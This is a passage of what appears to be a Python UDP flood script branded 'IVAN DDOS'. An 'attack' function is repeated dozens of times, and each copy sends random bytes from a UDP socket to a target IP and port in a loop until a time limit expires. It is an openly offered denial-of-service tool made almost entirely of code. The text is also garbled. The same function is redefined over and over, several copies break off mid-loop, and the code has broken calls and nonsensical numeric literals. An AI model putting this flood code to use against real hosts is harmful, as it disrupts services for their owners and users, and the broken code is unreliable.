        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

